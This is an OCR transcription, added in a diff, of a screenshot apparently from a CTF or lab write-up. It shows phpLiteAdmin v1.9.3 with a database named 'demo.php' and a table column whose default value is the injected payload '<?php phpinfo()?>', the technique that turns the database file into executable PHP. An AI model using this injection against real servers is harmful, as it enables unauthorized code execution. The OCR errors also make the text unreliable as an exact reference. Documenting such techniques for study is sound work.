@@ -1,0 +1,27 @@
+# OCR: 33010d9b09b2648aa004f096d8c10625.webp
+# 来源: .\02-WriteUp\2024\33010d9b09b2648aa004f096d8c10625.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:13
+
+phpLiteAdmin v1.9.3
+Documentation | License | Project Site
+‘Change Database
+[rw] /ust/databases/demo.php
+[nw] /usr/databases/test_users
+Jusridatabases/demo. php:
+{table} test
+Create New Database [7]
+i ees)
+Jusridatabases/demo.php — test
+Browse |[ structure |{ sat ][ Searcn |{ insert ][ Export ][ import |[ Rename ]{ Empty ]{ Drop |
+(Not wait (Defauit Value (Primary Key )
+(Cotumn# (Field (Type
+‘<?php phpinfo()?>"
+test INTEGER no
+团
+‘no
+口 edit delete 0
+CneckAll Uncheck All With selected:
+Add [ ] field(s) at end of table (Go}
+Query used to create this table
+(CREATE TABLE ‘test (test INTEGER default <?php phpinfo?>))
